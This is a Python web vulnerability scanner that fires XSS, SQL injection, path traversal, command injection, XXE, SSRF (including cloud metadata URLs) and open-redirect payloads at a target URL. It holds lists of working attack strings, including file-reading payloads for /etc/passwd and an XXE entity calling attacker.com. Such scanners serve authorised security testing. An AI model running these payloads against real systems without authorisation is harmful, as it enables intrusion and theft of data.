#!/usr/bin/env python3
"""
VulnTester - Advanced Vulnerability Testing Module
Author: Sayer Linux (SayerLinux1@gmail.com)
Description: Specialized vulnerability testing for specific vulnerability classes
"""

import requests
import re
import json
import time
import random
import concurrent.futures
from urllib.parse import urljoin, urlparse, parse_qs
from colorama import Fore, Style
from bs4 import BeautifulSoup

class VulnTester:
    """Advanced vulnerability testing module for specific vulnerability classes"""
    
    def __init__(self, timeout=30, threads=10):
        self.timeout = timeout
        self.threads = threads
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        
        # Vulnerability test payloads
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>',
            '\'><script>alert("XSS")</script>',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<input onfocus=alert("XSS") autofocus>'
        ]
        
        self.sqli_payloads = [
            "'",
            "''",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' #",
            "1' OR '1'='1'/*",
            "1' UNION SELECT NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' OR 1=1--",
            "1' OR 1=2--",
            "1' AND SLEEP(5)--",
            "1' OR SLEEP(5)--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1' OR pg_sleep(5)--"
        ]
        
        self.lfi_payloads = [
            '../../../etc/passwd',
            '../../etc/passwd',
            '../etc/passwd',
            '/etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '....//....//....//etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'expect://id',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
        ]
        
        self.rce_payloads = [
            '; id',
            '| id',
            '&& id',
            '`id`',
            '$(id)',
            '; whoami',
            '| whoami',
            '&& whoami',
            '`whoami`',
            '$(whoami)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '&& cat /etc/passwd',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            '; dir',
            '| dir',
            '&& dir',
            '`dir`',
            '$(dir)'
        ]
        
        self.xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><%xxe;>]>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>'
        ]
        
        self.ssrf_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://169.254.169.254',  # AWS metadata
            'http://metadata.google.internal',  # GCP metadata
            'file:///etc/passwd',
            'dict://127.0.0.1:11211/',  # Memcached
            'gopher://127.0.0.1:25/',  # SMTP
            'ftp://127.0.0.1:21/',
            'http://[::1]',  # IPv6 localhost
            'http://0000::1',  # IPv6 localhost alternative
            'http://0x7f000001',  # Hex localhost
            'http://2130706433'  # Decimal localhost
        ]
        
        self.redirect_payloads = [
            'http://evil.com',
            '//evil.com',
            '/\\evil.com',
            'https://evil.com',
            'ftp://evil.com',
            'javascript:alert("redirect")',
            'data:text/html,<script>alert("redirect")</script>'
        ]
    
    def test_xss(self, target, parameters=None):
        """Test for Cross-Site Scripting (XSS) vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing XSS vulnerabilities{Style.RESET_ALL}")
        
        vulnerabilities = []
        test_urls = []
        
        # If no parameters provided, try to discover them
        if not parameters:
            parameters = self.discover_parameters(target)
        
        # Test URL parameters
        for param in parameters:
            for payload in self.xss_payloads:
                test_url = self.inject_payload(target, param, payload)
                test_urls.append({
                    'url': test_url,
                    'param': param,
                    'payload': payload,
                    'type': 'url_param'
                })
        
        # Test forms
        forms = self.discover_forms(target)
        for form in forms:
            for payload in self.xss_payloads:
                test_urls.append({
                    'form': form,
                    'payload': payload,
                    'type': 'form'
                })
        
        # Execute tests
        def test_xss_payload(test_info):
            try:
                session = requests.Session()
                session.headers.update({'User-Agent': random.choice(self.user_agents)})
                
                if test_info['type'] == 'url_param':
                    response = session.get(test_info['url'], timeout=self.timeout)
                    
                    # Check if payload is reflected in response
                    if test_info['payload'] in response.text:
                        return {
                            'id': f'xss_{len(vulnerabilities) + 1}',
                            'name': 'Cross-Site Scripting (XSS)',
                            'severity': 'high',
                            'description': f'XSS vulnerability found in parameter {test_info["param"]}',
                            'location': test_info['url'],
                            'type': 'xss',
                            'payload': test_info['payload'],
                            'proof': f'Payload reflected in response',
                            'recommendation': 'Implement proper input validation and output encoding'
                        }
                
                elif test_info['type'] == 'form':
                    # Test form submission
                    form_data = {}
                    for field in test_info['form']['fields']:
                        form_data[field['name']] = test_info['payload']
                    
                    response = session.post(test_info['form']['action'], data=form_data, timeout=self.timeout)
                    
                    if test_info['payload'] in response.text:
                        return {
                            'id': f'xss_{len(vulnerabilities) + 1}',
                            'name': 'Cross-Site Scripting (XSS)',
                            'severity': 'high',
                            'description': f'XSS vulnerability found in form at {test_info["form"]["action"]}',
                            'location': test_info['form']['action'],
                            'type': 'xss',
                            'payload': test_info['payload'],
                            'proof': f'Payload reflected in response',
                            'recommendation': 'Implement proper input validation and output encoding'
                        }
                
                return None
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing XSS: {e}{Style.RESET_ALL}")
                return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_xss_payload, test_info) for test_info in test_urls]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    print(f"{Fore.RED}[+] XSS vulnerability found: {result['location']}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] XSS testing completed. Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}")
        return vulnerabilities
    
    def test_sqli(self, target, parameters=None):
        """Test for SQL Injection vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing SQL Injection vulnerabilities{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        if not parameters:
            parameters = self.discover_parameters(target)
        
        def test_sqli_payload(param, payload):
            try:
                session = requests.Session()
                session.headers.update({'User-Agent': random.choice(self.user_agents)})
                
                test_url = self.inject_payload(target, param, payload)
                response = session.get(test_url, timeout=self.timeout)
                
                # Check for SQL error messages
                sql_errors = [
                    'mysql_fetch_array',
                    'ORA-',
                    'Microsoft OLE DB Provider',
                    'SQLite error',
                    'PostgreSQL query failed',
                    'Warning: mysql_',
                    'MySQL error',
                    'SQL syntax',
                    'Unclosed quotation mark',
                    'ODBC SQL Server Driver'
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        return {
                            'id': f'sqli_{len(vulnerabilities) + 1}',
                            'name': 'SQL Injection',
                            'severity': 'critical',
                            'description': f'SQL Injection vulnerability found in parameter {param}',
                            'location': test_url,
                            'type': 'sqli',
                            'payload': payload,
                            'proof': f'SQL error detected: {error}',
                            'recommendation': 'Use parameterized queries and input validation'
                        }
                
                # Test for time-based blind SQLi
                if 'SLEEP(' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload:
                    start_time = time.time()
                    response = session.get(test_url, timeout=self.timeout + 10)
                    end_time = time.time()
                    
                    if end_time - start_time > 5:  # If response took longer than 5 seconds
                        return {
                            'id': f'sqli_blind_{len(vulnerabilities) + 1}',
                            'name': 'Blind SQL Injection',
                            'severity': 'critical',
                            'description': f'Blind SQL Injection vulnerability found in parameter {param}',
                            'location': test_url,
                            'type': 'sqli_blind',
                            'payload': payload,
                            'proof': f'Time-based detection: response took {end_time - start_time:.2f} seconds',
                            'recommendation': 'Use parameterized queries and input validation'
                        }
                
                return None
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing SQLi: {e}{Style.RESET_ALL}")
                return None
        
        test_cases = []
        for param in parameters:
            for payload in self.sqli_payloads:
                test_cases.append((param, payload))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_sqli_payload, param, payload) for param, payload in test_cases]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    print(f"{Fore.RED}[+] SQL Injection found: {result['location']}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] SQL Injection testing completed. Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}")
        return vulnerabilities
    
    def test_lfi(self, target, parameters=None):
        """Test for Local File Inclusion (LFI) vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing Local File Inclusion vulnerabilities{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        if not parameters:
            parameters = self.discover_parameters(target)
        
        def test_lfi_payload(param, payload):
            try:
                session = requests.Session()
                session.headers.update({'User-Agent': random.choice(self.user_agents)})
                
                test_url = self.inject_payload(target, param, payload)
                response = session.get(test_url, timeout=self.timeout)
                
                # Check for file content indicators
                file_indicators = [
                    'root:x:0:0:root:/root:/bin/bash',
                    'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
                    '[boot loader]',
                    '[operating systems]',
                    'Windows IP Configuration',
                    '127.0.0.1       localhost',
                    '::1             localhost'
                ]
                
                for indicator in file_indicators:
                    if indicator in response.text:
                        return {
                            'id': f'lfi_{len(vulnerabilities) + 1}',
                            'name': 'Local File Inclusion (LFI)',
                            'severity': 'high',
                            'description': f'LFI vulnerability found in parameter {param}',
                            'location': test_url,
                            'type': 'lfi',
                            'payload': payload,
                            'proof': f'File content detected: {indicator[:50]}...',
                            'recommendation': 'Use proper input validation and avoid user input in file paths'
                        }
                
                return None
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing LFI: {e}{Style.RESET_ALL}")
                return None
        
        test_cases = []
        for param in parameters:
            for payload in self.lfi_payloads:
                test_cases.append((param, payload))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_lfi_payload, param, payload) for param, payload in test_cases]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    print(f"{Fore.RED}[+] LFI vulnerability found: {result['location']}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] LFI testing completed. Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}")
        return vulnerabilities
    
    def test_rce(self, target, parameters=None):
        """Test for Remote Code Execution (RCE) vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing Remote Code Execution vulnerabilities{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        if not parameters:
            parameters = self.discover_parameters(target)
        
        def test_rce_payload(param, payload):
            try:
                session = requests.Session()
                session.headers.update({'User-Agent': random.choice(self.user_agents)})
                
                test_url = self.inject_payload(target, param, payload)
                response = session.get(test_url, timeout=self.timeout)
                
                # Check for command execution indicators
                cmd_indicators = [
                    'uid=',
                    'gid=',
                    'groups=',
                    'root',
                    'administrator',
                    'Windows IP Configuration',
                    'Ethernet adapter',
                    'total',
                    'drwxr-xr-x',
                    'Volume in drive'
                ]
                
                for indicator in cmd_indicators:
                    if indicator in response.text:
                        return {
                            'id': f'rce_{len(vulnerabilities) + 1}',
                            'name': 'Remote Code Execution (RCE)',
                            'severity': 'critical',
                            'description': f'RCE vulnerability found in parameter {param}',
                            'location': test_url,
                            'type': 'rce',
                            'payload': payload,
                            'proof': f'Command output detected: {indicator}',
                            'recommendation': 'Avoid user input in system commands and use proper input validation'
                        }
                
                return None
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing RCE: {e}{Style.RESET_ALL}")
                return None
        
        test_cases = []
        for param in parameters:
            for payload in self.rce_payloads:
                test_cases.append((param, payload))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_rce_payload, param, payload) for param, payload in test_cases]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    print(f"{Fore.RED}[+] RCE vulnerability found: {result['location']}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] RCE testing completed. Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}")
        return vulnerabilities
    
    def test_xxe(self, target):
        """Test for XML External Entity (XXE) vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing XML External Entity vulnerabilities{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        # Test XML endpoints
        xml_endpoints = self.discover_xml_endpoints(target)
        
        for endpoint in xml_endpoints:
            for payload in self.xxe_payloads:
                try:
                    session = requests.Session()
                    session.headers.update({
                        'User-Agent': random.choice(self.user_agents),
                        'Content-Type': 'application/xml'
                    })
                    
                    response = session.post(endpoint, data=payload, timeout=self.timeout)
                    
                    # Check for file content
                    file_indicators = [
                        'root:x:0:0:root:/root:/bin/bash',
                        '[boot loader]',
                        'Windows IP Configuration'
                    ]
                    
                    for indicator in file_indicators:
                        if indicator in response.text:
                            vulnerability = {
                                'id': f'xxe_{len(vulnerabilities) + 1}',
                                'name': 'XML External Entity (XXE)',
                                'severity': 'critical',
                                'description': f'XXE vulnerability found at {endpoint}',
                                'location': endpoint,
                                'type': 'xxe',
                                'payload': payload,
                                'proof': f'File content detected: {indicator[:50]}...',
                                'recommendation': 'Disable external entity processing in XML parsers'
                            }
                            vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[+] XXE vulnerability found: {endpoint}{Style.RESET_ALL}")
                            break
                
                except Exception as e:
                    print(f"{Fore.RED}[-] Error testing XXE: {e}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] XXE testing completed. Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}")
        return vulnerabilities
    
    def test_ssrf(self, target, parameters=None):
        """Test for Server-Side Request Forgery (SSRF) vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing Server-Side Request Forgery vulnerabilities{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        if not parameters:
            parameters = self.discover_parameters(target)
        
        def test_ssrf_payload(param, payload):
            try:
                session = requests.Session()
                session.headers.update({'User-Agent': random.choice(self.user_agents)})
                
                test_url = self.inject_payload(target, param, payload)
                response = session.get(test_url, timeout=self.timeout)
                
                # Check for SSRF indicators
                ssrf_indicators = [
                    'AWS',
                    'amazonaws',
                    'metadata',
                    'instance-id',
                    'ami-id',
                    'accountId',
                    'Google',
                    'metadata.google.internal',
                    'computeMetadata'
                ]
                
                for indicator in ssrf_indicators:
                    if indicator in response.text:
                        return {
                            'id': f'ssrf_{len(vulnerabilities) + 1}',
                            'name': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'critical',
                            'description': f'SSRF vulnerability found in parameter {param}',
                            'location': test_url,
                            'type': 'ssrf',
                            'payload': payload,
                            'proof': f'SSRF indicator detected: {indicator}',
                            'recommendation': 'Validate and sanitize user input URLs, implement allowlists'
                        }
                
                return None
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing SSRF: {e}{Style.RESET_ALL}")
                return None
        
        test_cases = []
        for param in parameters:
            for payload in self.ssrf_payloads:
                test_cases.append((param, payload))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_ssrf_payload, param, payload) for param, payload in test_cases]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    print(f"{Fore.RED}[+] SSRF vulnerability found: {result['location']}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] SSRF testing completed. Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}")
        return vulnerabilities
    
    def test_open_redirect(self, target, parameters=None):
        """Test for Open Redirect vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing Open Redirect vulnerabilities{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        if not parameters:
            parameters = self.discover_parameters(target)
        
        def test_redirect_payload(param, payload):
            try:
                session = requests.Session()
                session.headers.update({'User-Agent': random.choice(self.user_agents)})
                
                test_url = self.inject_payload(target, param, payload)
                response = session.get(test_url, timeout=self.timeout, allow_redirects=False)
                
                # Check for redirect to external domain
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location or location.startswith('http://evil.com'):
                        return {
                            'id': f'redirect_{len(vulnerabilities) + 1}',
                            'name': 'Open Redirect',
                            'severity': 'medium',
                            'description': f'Open redirect vulnerability found in parameter {param}',
                            'location': test_url,
                            'type': 'open_redirect',
                            'payload': payload,
                            'proof': f'Redirects to: {location}',
                            'recommendation': 'Validate redirect URLs and use allowlists'
                        }
                
                return None
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing redirect: {e}{Style.RESET_ALL}")
                return None
        
        test_cases = []
        for param in parameters:
            for payload in self.redirect_payloads:
                test_cases.append((param, payload))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_redirect_payload, param, payload) for param, payload in test_cases]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    print(f"{Fore.RED}[+] Open redirect found: {result['location']}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] Open redirect testing completed. Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}")
        return vulnerabilities
    
    def discover_parameters(self, target):
        """Discover URL parameters"""
        parameters = []
        
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            response = session.get(target, timeout=self.timeout)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # Extract parameters from forms
                for form in soup.find_all('form'):
                    for input_field in form.find_all(['input', 'select', 'textarea']):
                        param_name = input_field.get('name')
                        if param_name and param_name not in parameters:
                            parameters.append(param_name)
                
                # Extract parameters from JavaScript
                scripts = soup.find_all('script')
                for script in scripts:
                    if script.string:
                        # Look for AJAX calls
                        ajax_params = re.findall(r'\$\.(?:get|post)\s*\([^,]+,\s*\{([^}]+)\}', script.string)
                        for params in ajax_params:
                            param_matches = re.findall(r'(\w+)\s*:', params)
                            for param in param_matches:
                                if param not in parameters:
                                    parameters.append(param)
            
            # Common parameter names
            common_params = ['id', 'user', 'name', 'page', 'file', 'url', 'redirect', 'next', 'return', 'callback']
            for param in common_params:
                if param not in parameters:
                    parameters.append(param)
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error discovering parameters: {e}{Style.RESET_ALL}")
        
        return parameters
    
    def discover_forms(self, target):
        """Discover forms on the page"""
        forms = []
        
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            response = session.get(target, timeout=self.timeout)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.content, 'html.parser')
                
                for form in soup.find_all('form'):
                    form_info = {
                        'action': urljoin(target, form.get('action', '')),
                        'method': form.get('method', 'GET').upper(),
                        'fields': []
                    }
                    
                    for input_field in form.find_all(['input', 'select', 'textarea']):
                        field_info = {
                            'name': input_field.get('name'),
                            'type': input_field.get('type', 'text'),
                            'value': input_field.get('value', '')
                        }
                        form_info['fields'].append(field_info)
                    
                    forms.append(form_info)
        
        except Exception as e:
            print(f"{Fore.RED}[-] Error discovering forms: {e}{Style.RESET_ALL}")
        
        return forms
    
    def discover_xml_endpoints(self, target):
        """Discover XML endpoints"""
        endpoints = []
        
        # Common XML endpoints
        xml_paths = [
            'api/xml',
            'api/soap',
            'soap',
            'xmlrpc.php',
            'xmlrpc',
            'api',
            'services',
            'endpoint'
        ]
        
        try:
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(self.user_agents)})
            
            for path in xml_paths:
                url = urljoin(target, path)
                
                # Test with XML content type
                headers = {'Content-Type': 'application/xml'}
                response = session.post(url, data='<test></test>', headers=headers, timeout=self.timeout)
                
                if response.status_code in [200, 400, 500]:
                    endpoints.append(url)
        
        except Exception as e:
            print(f"{Fore.RED}[-] Error discovering XML endpoints: {e}{Style.RESET_ALL}")
        
        return endpoints
    
    def inject_payload(self, url, param, payload):
        """Inject payload into URL parameter"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Inject payload
        params[param] = payload
        
        # Rebuild URL
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url
    
    def run_all_tests(self, target):
        """Run all vulnerability tests"""
        print(f"{Fore.GREEN}[+] Starting comprehensive vulnerability testing on {target}{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        
        # Run all test types
        test_methods = [
            self.test_xss,
            self.test_sqli,
            self.test_lfi,
            self.test_rce,
            self.test_xxe,
            self.test_ssrf,
            self.test_open_redirect
        ]
        
        for test_method in test_methods:
            try:
                vulns = test_method(target)
                all_vulnerabilities.extend(vulns)
            except Exception as e:
                print(f"{Fore.RED}[-] Error in {test_method.__name__}: {e}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] Vulnerability testing completed. Total vulnerabilities found: {len(all_vulnerabilities)}{Style.RESET_ALL}")
        
        return {
            'target': target,
            'vulnerabilities': all_vulnerabilities,
            'summary': {
                'total': len(all_vulnerabilities),
                'critical': len([v for v in all_vulnerabilities if v['severity'] == 'critical']),
                'high': len([v for v in all_vulnerabilities if v['severity'] == 'high']),
                'medium': len([v for v in all_vulnerabilities if v['severity'] == 'medium']),
                'low': len([v for v in all_vulnerabilities if v['severity'] == 'low'])
            }
        }
    
    def scan_target(self, target):
        """Alias for run_all_tests to maintain compatibility"""
        return self.run_all_tests(target)